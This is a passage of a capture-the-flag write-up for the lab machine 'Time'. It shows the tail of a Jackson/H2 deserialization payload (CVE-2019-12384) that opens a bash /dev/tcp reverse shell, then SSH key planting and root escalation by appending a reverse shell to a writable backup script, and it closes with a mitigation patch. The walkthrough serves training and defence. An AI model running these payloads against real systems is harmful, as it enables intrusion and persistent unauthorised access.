	<span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">command</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\A&#34;</span><span class="o">);</span>
	<span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>  <span class="o">}</span>
<span class="n">$$</span><span class="o">;</span>
<span class="n">CALL</span> <span class="nf">SHELLEXEC</span><span class="o">(</span><span class="err">&#39;</span><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="n">10</span><span class="o">.</span><span class="na">10</span><span class="o">.</span><span class="na">14</span><span class="o">.</span><span class="na">19</span><span class="o">/</span><span class="n">9000</span> <span class="n">0</span><span class="o">&gt;&amp;</span><span class="n">1</span><span class="err">&#39;</span><span class="o">)</span>
</code></pre></div><p>I can obtain an interactive shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
$ nc -nvlp <span class="m">9000</span>            
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
connect to <span class="o">[</span>10.10.14.19<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.214<span class="o">]</span> <span class="m">42496</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>944<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
pericles@time:/var/www/html$ 
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210508205643332.png" alt="image-20210508205643332"  /></div>
</p>
<h4 id="upgrade-to-ssh">Upgrade to SSH</h4>
<p>With current access, I can put my public key to the <code>authorized_keys</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:/home/pericles$ mkdir .ssh
pericles@time:/home/pericles$
pericles@time:/home/pericles$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#39;</span> &gt; .ssh/authorized_keys
</code></pre></div><p>Now I can login as <code>pericles</code> with my SSH private key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
$ ssh pericles@10.10.10.214 
Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-52-generic x86_64<span class="o">)</span>

...&lt;SNIP&gt;...
  System load:             0.0
  Usage of /:              21.2% of 27.43GB
  Memory usage:            16%
  Swap usage:              0%
  Processes:               <span class="m">235</span>
  Users logged in:         <span class="m">0</span>
  IPv4 address <span class="k">for</span> ens160: 10.10.10.214
  IPv6 address <span class="k">for</span> ens160: dead:beef::250:56ff:feb9:a553

...&lt;SNIP&gt;...
Last login: Fri Oct <span class="m">23</span> 09:19:19 <span class="m">2020</span> from 10.10.14.5
pericles@time:~$ id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>pericles<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>pericles<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>pericles<span class="o">)</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p><code>pericles</code> is the only user on this box.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:/home/pericles$ cat /etc/passwd <span class="p">|</span> grep sh$
cat /etc/passwd <span class="p">|</span> grep sh$
root:x:0:0:root:/root:/bin/bash
pericles:x:1000:1000:Pericles:/home/pericles:/bin/bash
</code></pre></div><p>While searching files owned by <code>pericles</code>, I spotted a script called <code>timer_backup.sh</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ find / -type f -user pericles 2&gt;/dev/null <span class="p">|</span>grep -v <span class="s1">&#39;proc\|sys&#39;</span>
/usr/bin/timer_backup.sh
/dev/shm/payloadds9LXy
/home/pericles/.gnupg/trustdb.gpg
/home/pericles/.gnupg/pubring.kbx
/home/pericles/.bashrc
...&lt;SNIP&gt;...
</code></pre></div><p>The script is backing up the website contents in <code>/var/www/html</code> to the root home directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ cat /usr/bin/timer_backup.sh
<span class="c1">#!/bin/bash</span>
zip -r website.bak.zip /var/www/html <span class="o">&amp;&amp;</span> mv website.bak.zip /root/backup.zip
</code></pre></div><p>Interestingly, that script is writable by others.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ ls -l /usr/bin/timer_backup.sh 
-rwxrw-rw- <span class="m">1</span> pericles pericles <span class="m">88</span> Apr <span class="m">10</span> 21:05 /usr/bin/timer_backup.sh
</code></pre></div><p>I searched other file related to the script, and found out there is a timer owned by root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ find / -type f -name <span class="s2">&#34;timer_backup*&#34;</span> -ls 2&gt;/dev/null
   <span class="m">795750</span>      <span class="m">4</span> -rw-r--r--   <span class="m">1</span> root     root          <span class="m">214</span> Oct <span class="m">23</span> 06:46 /etc/systemd/system/timer_backup.timer
   <span class="m">787186</span>      <span class="m">4</span> -rw-r--r--   <span class="m">1</span> root     root          <span class="m">159</span> Oct <span class="m">23</span> 05:59 /etc/systemd/system/timer_backup.service
  <span class="m">1317302</span>      <span class="m">4</span> -rwxrw-rw-   <span class="m">1</span> pericles pericles       <span class="m">88</span> Apr <span class="m">10</span> 21:10 /usr/bin/timer_backup.sh
</code></pre></div><p><code>timer_backup.timer</code> requires <code>timer_backup.service</code>,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ cat /etc/systemd/system/timer_backup.timer 
<span class="o">[</span>Unit<span class="o">]</span>
<span class="nv">Description</span><span class="o">=</span>Backup of the website
<span class="nv">Requires</span><span class="o">=</span>timer_backup.service

<span class="o">[</span>Timer<span class="o">]</span>
<span class="nv">Unit</span><span class="o">=</span>timer_backup.service
<span class="c1">#OnBootSec=10s</span>
<span class="c1">#OnUnitActiveSec=10s</span>
<span class="nv">OnUnitInactiveSec</span><span class="o">=</span>10s
<span class="nv">AccuracySec</span><span class="o">=</span>1ms

<span class="o">[</span>Install<span class="o">]</span>
<span class="nv">WantedBy</span><span class="o">=</span>timers.target
</code></pre></div><p>and what <code>timer_backup.service</code> doing is it restarts <code>web_backup.service</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ cat /etc/systemd/system/timer_backup.service 
<span class="o">[</span>Unit<span class="o">]</span>
<span class="nv">Description</span><span class="o">=</span>Calls website backup
<span class="nv">Wants</span><span class="o">=</span>timer_backup.timer
<span class="nv">WantedBy</span><span class="o">=</span>multi-user.target

<span class="o">[</span>Service<span class="o">]</span>
<span class="nv">ExecStart</span><span class="o">=</span>/usr/bin/systemctl restart web_backup.service
</code></pre></div><p><code>web_backup.service</code> executes the <code>timer_backup.sh</code> script which is owned by <code>pericles</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ cat /etc/systemd/system/web_backup.service
<span class="o">[</span>Unit<span class="o">]</span>
<span class="nv">Description</span><span class="o">=</span>Creates backups of the website

<span class="o">[</span>Service<span class="o">]</span>
<span class="nv">ExecStart</span><span class="o">=</span>/bin/bash /usr/bin/timer_backup.sh
</code></pre></div><h4 id="exploiting-timer_backupsh">Exploiting timer_backup.sh</h4>
<p>With writable access, I can put a <code>bash</code> reverse shell in <code>timer_backup.sh</code>, and then setup a <code>nc</code> listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">pericles@time:~$ <span class="nb">echo</span> <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.19/9002 0&gt;&amp;1&#39;</span> &gt;&gt; /usr/bin/timer_backup.sh 
pericles@time:~$ 
pericles@time:~$ cat /usr/bin/timer_backup.sh 
<span class="c1">#!/bin/bash</span>
zip -r website.bak.zip /var/www/html <span class="o">&amp;&amp;</span> mv website.bak.zip /root/backup.zip
bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.72/9002 0&gt;<span class="p">&amp;</span><span class="m">1</span>
</code></pre></div><p>Within a few seconds, I have a root shell on my listener, but the problem is that shell is somehow exited by itself.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
$ rlwrap nc -nvlp <span class="m">9002</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9002</span> ...
connect to <span class="o">[</span>10.10.14.72<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.214<span class="o">]</span> <span class="m">57648</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>411032<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
root@time:/# 
root@time:/# <span class="nb">exit</span>
</code></pre></div><p>So I repeated the steps, but this time, I immediately injected my public key to the root&rsquo;s <code>authorized_keys</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
$ nc -nvlp <span class="m">9002</span>                          
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9002</span> ...
connect to <span class="o">[</span>10.10.14.19<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.214<span class="o">]</span> <span class="m">34182</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>65312<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
root@time:/#  <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#39;</span> &gt; /root/.ssh/authorized_keys
&lt;rj6mXxSIGq3E5ks1g+moK<span class="err">&#39;</span> &gt; /root/.ssh/authorized_keys
root@time:/# <span class="nb">exit</span>
</code></pre></div><p>After that, I can login as root via SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «time» «10.10.14.19» 
$ ssh root@10.10.10.214
Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-52-generic x86_64<span class="o">)</span>

...&lt;SNIP&gt;...
  System load:             0.0
  Usage of /:              21.2% of 27.43GB
  Memory usage:            16%
  Swap usage:              0%
  Processes:               <span class="m">235</span>
  Users logged in:         <span class="m">0</span>
  IPv4 address <span class="k">for</span> ens160: 10.10.10.214
  IPv6 address <span class="k">for</span> ens160: dead:beef::250:56ff:feb9:a553


...&lt;SNIP&gt;...
Last login: Tue Feb  <span class="m">9</span> 14:41:33 <span class="m">2021</span>
root@time:~# id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@time:~# cut -c-16 root.txt 
27375f967f43232f
</code></pre></div><h2 id="extras">Extras</h2>
<p>In this extras, I&rsquo;ll take a look into the vulnerable code that allows me to gain a remote code execution, and then I&rsquo;ll try to patch it.</p>
<h3 id="cve-2019-12384">CVE-2019-12384</h3>
<h4 id="causes">Causes</h4>
<p>According to <a href="https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917">this site</a>, in order to successfully exploit a Jackson deserialization vulnerability several conditions must be met.</p>
<p><div class="img-container"><img src="imgs/image-20210509215030250.png" alt="image-20210509215030250"  /></div>
</p>
<p>The first condition is fulfilled by the <code>index.php</code> file (<code>/var/www/html/index.php</code>). I have control on the user input.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">])){</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;mode&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;mode&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&#34;2&#34;</span><span class="p">){</span>
                <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">tempnam</span><span class="p">(</span><span class="s2">&#34;/dev/shm&#34;</span><span class="p">,</span> <span class="s2">&#34;payload&#34;</span><span class="p">);</span>
                <span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Unable to open file!&#34;</span><span class="p">);</span>
                <span class="nv">$txt</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">];</span> <span class="c1">// Condition #1,  $txt controlled by user. no filter
</span><span class="c1"></span>                <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">,</span> <span class="nv">$txt</span><span class="p">);</span> 
                <span class="nx">fclose</span><span class="p">(</span><span class="nv">$myfile</span><span class="p">);</span>
                <span class="nx">exec</span><span class="p">(</span><span class="s2">&#34;/usr/bin/jruby /opt/json_project/parse.rb </span><span class="si">$filename</span><span class="s2"> 2&gt;&amp;1&#34;</span><span class="p">,</span> <span class="nv">$cmdout</span><span class="p">,</span> <span class="nv">$ret</span><span class="p">);</span>
                <span class="nx">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="nv">$ret</span> <span class="o">===</span> <span class="mi">0</span><span class="p">){</span>
                        <span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&lt;pre&gt;Validation successful!&lt;/pre&gt;&#39;</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">else</span><span class="p">{</span>
                        <span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&lt;pre&gt;Validation failed: &#39;</span> <span class="o">.</span> <span class="nv">$cmdout</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span><span class="p">{</span>
                <span class="nv">$json_ugly</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">];</span>
                <span class="nv">$json_pretty</span> <span class="o">=</span> <span class="nx">json_encode</span><span class="p">(</span><span class="nx">json_decode</span><span class="p">(</span><span class="nv">$json_ugly</span><span class="p">),</span> <span class="nx">JSON_PRETTY_PRINT</span><span class="p">);</span>
                <span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&lt;pre&gt;&#39;</span><span class="o">.</span><span class="nv">$json_pretty</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span>
        <span class="p">}</span>

<span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span><span class="err">...&lt;SNIP&gt;...
</span></code></pre></div><p>The second condition fulfilled by the parser itself (<code>/opt/json_project/parse.rb</code>). It uses &ldquo;Default typing&rdquo;.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;java&#39;</span>

<span class="no">Dir</span><span class="o">[</span><span class="s2">&#34;/opt/json_project/classpath/*.jar&#34;</span><span class="o">].</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span>
      <span class="nb">require</span> <span class="n">f</span>
<span class="k">end</span>

<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.ObjectMapper&#39;</span>
<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.SerializationFeature&#39;</span>
<span class="n">f</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">)</span>
<span class="n">content</span> <span class="o">=</span> <span class="n">f</span>
<span class="nb">puts</span> <span class="n">content</span>

<span class="n">mapper</span> <span class="o">=</span> <span class="no">ObjectMapper</span><span class="o">.</span><span class="n">new</span>
<span class="n">mapper</span><span class="o">.</span><span class="n">enableDefaultTyping</span><span class="p">()</span> <span class="c1"># Condition #2, the uses of &#34;default typing&#34;.</span>
<span class="n">mapper</span><span class="o">.</span><span class="n">configure</span><span class="p">(</span><span class="no">SerializationFeature</span><span class="o">::</span><span class="no">FAIL_ON_EMPTY_BEANS</span><span class="p">,</span> <span class="kp">false</span><span class="p">);</span>
<span class="n">obj</span> <span class="o">=</span> <span class="n">mapper</span><span class="o">.</span><span class="n">readValue</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Object</span><span class="o">.</span><span class="n">java_class</span><span class="p">)</span> <span class="c1"># invokes all the setters</span>
<span class="nb">puts</span> <span class="s2">&#34;stringified: &#34;</span> <span class="o">+</span> <span class="n">mapper</span><span class="o">.</span><span class="n">writeValueAsString</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
</code></pre></div><p>The third condition is fulfilled by <code>logback-core-1.3.0-alpha5.jar</code> as the gadget class and <code>h2–1.4.199.jar</code> for the RCE capability. According to this <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">blog</a>, the H2 database alias feature can be abused. The researcher of CVE-2019–12384 abuses the alias feature to embed Java code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@time:/opt/json_project# grep -Ri version
Binary file classpath/h2-1.4.199.jar matches
Binary file classpath/jackson-databind-2.9.8.jar matches
Binary file classpath/logback-core-1.3.0-alpha5.jar matches
Binary file classpath/jackson-core-2.9.8.jar matches
</code></pre></div><h4 id="mitigation">Mitigation</h4>
<p>After I make sure there is no one currently exploiting the box, I tried to update the Jackson library to the v2.11 and also applied the new feature to mitigate the deserialization attack on the source code. Here is the updated version of <code>parse.rb</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;java&#39;</span>

<span class="no">Dir</span><span class="o">[</span><span class="s2">&#34;/opt/json_project/classpath/*.jar&#34;</span><span class="o">].</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">f</span><span class="o">|</span>
      <span class="nb">require</span> <span class="n">f</span>
<span class="k">end</span>

<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.ObjectMapper&#39;</span>
<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.SerializationFeature&#39;</span>
<span class="n">java_import</span> <span class="s1">&#39;com.fasterxml.jackson.databind.MapperFeature&#39;</span> <span class="c1"># ==&gt; Mitigation v2.11 </span>
<span class="n">f</span> <span class="o">=</span> <span class="no">File</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">)</span>
<span class="n">content</span> <span class="o">=</span> <span class="n">f</span>
<span class="nb">puts</span> <span class="n">content</span>

<span class="n">mapper</span> <span class="o">=</span> <span class="no">ObjectMapper</span><span class="o">.</span><span class="n">new</span>
<span class="n">mapper</span><span class="o">.</span><span class="n">activateDefaultTyping</span><span class="p">()</span> <span class="c1"># ==&gt; Mitigation v2.10, enableDefaultTyping() to activateDefaultTyping() </span>
<span class="n">mapper</span><span class="o">.</span><span class="n">configure</span><span class="p">(</span><span class="no">MapperFeature</span><span class="o">::</span><span class="no">BLOCK_UNSAFE_POLYMORPHIC_BASE_TYPES</span><span class="p">);</span> <span class="c1"># ==&gt; Mitigation v2.11 </span>
<span class="n">mapper</span><span class="o">.</span><span class="n">configure</span><span class="p">(</span><span class="no">SerializationFeature</span><span class="o">::</span><span class="no">FAIL_ON_EMPTY_BEANS</span><span class="p">,</span> <span class="kp">false</span><span class="p">);</span>
<span class="n">obj</span> <span class="o">=</span> <span class="n">mapper</span><span class="o">.</span><span class="n">readValue</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">java</span><span class="o">.</span><span class="n">lang</span><span class="o">.</span><span class="n">Object</span><span class="o">.</span><span class="n">java_class</span><span class="p">)</span> <span class="c1"># invokes all the setters</span>
<span class="nb">puts</span> <span class="s2">&#34;stringified: &#34;</span> <span class="o">+</span> <span class="n">mapper</span><span class="o">.</span><span class="n">writeValueAsString</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
</code></pre></div><p>I also write a dirty script to patch it as well as to revert the patch, so I can perform a quick test. The script is supposed to be executed  from Time where the updated parser and the newer version of Jackson are  hosted from my machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
</span><span class="cp"></span><span class="c1"># ./time.sh patch [ip]</span>
<span class="nv">project_path</span><span class="o">=</span><span class="s2">&#34;/opt/json_project/&#34;</span>
<span class="nv">new_jackson</span><span class="o">=</span><span class="s2">&#34;jackson-core-2.11.0.jar&#34;</span>
<span class="nv">old_jackson</span><span class="o">=</span><span class="s2">&#34;jackson-core-2.9.8.jar&#34;</span>

<span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;patch&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
	<span class="c1"># backup the original code</span>
	mkdir -p /dev/shm/orig/
	mv <span class="nv">$project_path</span><span class="s2">&#34;classpath/&#34;</span><span class="nv">$old_jackson</span> /dev/shm/orig/
	mv <span class="nv">$project_path</span><span class="s2">&#34;parse.rb&#34;</span> /dev/shm/orig/
	
	<span class="c1"># These file hosted from my machine</span>
	curl -s <span class="s2">&#34;http://</span><span class="nv">$2</span><span class="s2">/</span><span class="nv">$new_jackson</span><span class="s2">&#34;</span> &gt; /tmp/<span class="nv">$new_jackson</span>
	curl -s <span class="s2">&#34;http://</span><span class="nv">$2</span><span class="s2">/parse.rb&#34;</span> &gt;  /tmp/parse.rb
	
	<span class="c1"># move the updated parser and jackson</span>
	cp /tmp/<span class="nv">$new_jackson</span> <span class="nv">$project_path</span><span class="s2">&#34;classpath/&#34;</span><span class="nv">$new_jackson</span> 
	cp /tmp/parse.rb <span class="s2">&#34;</span><span class="nv">$project_path</span><span class="s2">&#34;</span>
	chmod +x <span class="nv">$project_path</span><span class="s2">&#34;parse.rb&#34;</span>
	
<span class="k">elif</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;restore&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
	rm <span class="nv">$project_path</span><span class="s2">&#34;classpath/&#34;</span><span class="nv">$new_jackson</span>
	rm <span class="nv">$project_path</span><span class="s2">&#34;parse.rb&#34;</span>
	
	mv <span class="s2">&#34;/dev/shm/orig/</span><span class="nv">$old_jackson</span><span class="s2">&#34;</span> <span class="nv">$project_path</span><span class="s2">&#34;classpath/&#34;</span>
	mv <span class="s2">&#34;/dev/shm/orig/parse.rb&#34;</span> <span class="nv">$project_path</span>
	
	rm /tmp/<span class="nv">$new_jackson</span> 
	rm /tmp/parse.rb
	rm -r /dev/shm/orig/
	
<span class="k">fi</span>
</code></pre></div><p>I tried to exploit the validator again by reproducing the same steps as  in the Foothold section, but this time my reverse shell didn’t connect  back. I checked the validator on the browser, and now it returned this  message.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Validation failed: WARNING: An illegal reflective access operation has occurred
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210509210620009.png" alt="image-20210509210620009"  /></div>
</p>
<p>Well, it is working, isn’t it?</p>
<hr>
<h2 id="references">References</h2>
<p>Exploitation:</p>
<ul>
<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">https://blog.doyensec.com/2019/07/22/jackson-gadgets.html</a></li>
<li><a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html</a></li>
</ul>
<p>Mitigation:</p>
<ul>
<li><a href="https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062">https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062</a></li>
<li><a href="https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917">https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
